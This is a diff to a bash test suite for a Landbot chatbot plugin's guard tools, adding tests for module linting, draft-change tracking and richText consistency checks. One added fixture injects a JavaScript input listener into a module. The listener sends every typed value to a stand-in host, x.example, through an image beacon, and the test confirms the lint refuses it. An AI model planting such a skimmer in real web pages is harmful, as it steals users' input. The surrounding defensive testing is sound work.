@@ -7,7 +7,7 @@ SRC="$HERE/plugins/landbot/skills/landbot-flows/scripts"
 TROOT="$(mktemp -d)"; trap 'rm -rf "$TROOT"' EXIT
 T="$TROOT/landbot-flows/scripts"; mkdir -p "$T" "$TROOT/landbot-style/modules"
 cp "$HERE/plugins/landbot/skills/landbot-style/modules/"*.js "$TROOT/landbot-style/modules/"
-cp "$SRC/channel" "$SRC/draft-check" "$T/"; cp "$SRC/lb" "$T/lb.real"
+cp "$SRC/channel" "$SRC/draft-check" "$SRC/richtext.jq" "$T/"; cp "$SRC/lb" "$T/lb.real"
 export LANDBOT_STATE_DIR="$T/state"
 cat > "$T/lb" <<'E'
 #!/usr/bin/env bash
@@ -92,6 +92,12 @@ t "module with CONFIG changed is accepted" 4:1 "$C" js "$T/steps-cfg.js" --bot B
 t "module unchanged is accepted"           4:1 "$C" js "$M/messaging.js" --bot BOT
 t "module with code in CONFIG refused"    65:0 "$C" js "$T/steps-fn.js" --bot BOT
 t "module with changed code refused"      65:0 "$C" js "$T/steps-code.js" --bot BOT
+awk '{ if ($0 ~ /^[[:space:]]*\};[[:space:]]*$/ && !d) { print "  }; document.addEventListener(\"input\", function(e){ (new Image()).src = \"https://x.example/c?v=\" + e.target.value; });"; d=1 } else print }' "$M/steps.js" > "$T/steps-tail.js"
+grep -q 'new Image' "$T/steps-tail.js" && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL could not build the CONFIG-tail fixture"; }
+t "code after CONFIG's closing brace refused" 65:0 "$C" js "$T/steps-tail.js" --bot BOT
+{ cat "$M/steps.js"; echo "/* a harmless comment */"; } > "$T/steps-comment.js"
+t "edited module with --custom goes to the custom lint" 4:1 "$C" js "$T/steps-comment.js" --bot BOT --custom
+t "edited module without --custom refused"              65:0 "$C" js "$T/steps-comment.js" --bot BOT
 printf '{"foot":null,"version":"3.1.0"}' > "$T/cfg-nofoot.json"
 t "js stored, not served"      3:1 env MOCK_CFG="file://$T/cfg-nofoot.json" "$C" js "$T/ok.js" --bot BOT --custom
 printf '{"foot":"<script>x</script>","version":"3.1.0"}' > "$T/cfg-other.json"
@@ -141,8 +147,28 @@ MOCK_DRAFT="$T/edited.json" "$DK" save BOTU --auto >/dev/null 2>&1
 g "pending change blocks after an auto save" 65 edited.json
 MOCK_DRAFT="$T/edited.json" "$DK" save BOTU >/dev/null 2>&1
 g "manual save clears the pending change"     0 edited.json
+# around a write: a change the write does not explain becomes pending; the write's own change does not
+MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
+MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
+MOCK_DRAFT="$T/edited.json" "$DK" post BOTU '{"ids":["welcome"],"allow_added":false,"all":false}' >/dev/null 2>&1
+g "own change around a write is not pending"  0 edited.json
+MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
+MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
+MOCK_DRAFT="$T/edited.json" "$DK" post BOTU '{"ids":["bye"],"allow_added":false,"all":false}' >/dev/null 2>&1
+g "someone else's change during a write is pending" 65 edited.json
+rm -rf "$T/state"
+MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
+MOCK_DRAFT="$T/good.json" "$DK" post BOTU '{"ids":["welcome"],"allow_added":false,"all":false}' >/dev/null 2>&1
+g "first write on this machine stays pending"  65 good.json
+MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
 MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
 MOCK_DRAFT="$T/edited.json" "$DK" diff BOTU >/dev/null 2>&1; [ $? = 1 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL diff should report the edit"; }
+
+# a draft over 1 MB (more than a command line holds) must still compare as unchanged, not as a failure
+jq '.data.diagram.nodes += ([range(0; 1200)] | map({key: "n\(.)", value: {id: "n\(.)", template: "chat", params: {messages: [{text: ("x" * 900)}]}}}) | from_entries)' "$T/good.json" > "$T/big.json"
+[ "$(wc -c < "$T/big.json" | tr -d ' ')" -gt 1048576 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL big fixture is not over 1 MB"; }
+MOCK_DRAFT="$T/big.json" "$DK" save BIGU >/dev/null 2>&1
+MOCK_DRAFT="$T/big.json" "$DK" diff BIGU >/dev/null 2>&1; [ $? = 0 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a draft over 1 MB does not compare as unchanged"; }
 
 L="$T/lb.real"; export LANDBOT_API_TOKEN=dummy LANDBOT_API_URL=http://127.0.0.1:9
 # publish goes through the gate: a blocked draft is refused before anything is sent (65), a clean one reaches the network (1)
@@ -199,6 +225,9 @@ t "richText differing only in punctuation refused" 65:0 "$L" PATCH /bots/x/draft
 t "Chinese richText differing refused"             65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"你好，请问您的名字？","richText":"<p>你好，请问您的邮箱？</p>"}}'
 t "Chinese richText matching sent"                  1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"你好，请问您的名字？","richText":"<p>你好，请问您的名字？</p>"}}'
 t "multi-line richText matching sent"               1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Line one\nLine two","richText":"<p>Line one</p><p>Line two</p>"}}'
+t "numeric entity hiding a change refused"         65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Pay $1.00","richText":"<p>Pay &#36;100</p>"}}'
+t "markdown link matching sent"                     1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"See [our site](https://x.example)","richText":"<p>See <a href=\"https://x.example\">our site</a></p>"}}'
+t "unknown entity refused"                         65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Hi","richText":"<p>Hi &hellip;</p>"}}'
 
 echo "guards: $pass passed, $fail failed"
 [ "$fail" = 0 ]
